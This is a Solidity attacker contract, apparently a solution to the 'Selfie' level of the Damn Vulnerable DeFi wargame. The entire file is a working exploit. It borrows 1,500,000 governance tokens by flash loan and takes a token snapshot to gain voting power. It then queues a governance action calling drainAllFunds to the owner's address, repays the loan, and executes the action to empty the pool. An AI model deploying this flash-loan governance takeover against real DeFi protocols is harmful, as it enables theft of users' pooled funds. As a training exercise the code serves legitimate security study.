// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker {
    address owner;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    constructor(address payable _poolAddress, address _governance, address _token) {
        pool = SelfiePool(_poolAddress);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function Attack() public {
        require(msg.sender == owner, "Only owner can call");
        pool.flashLoan(1500000 ether);
    }

    function receiveTokens(address _token, uint256 amount) public {
        token.snapshot();
        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
        token.transfer(msg.sender, amount);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can call");
        governance.executeAction(1);
    }
}
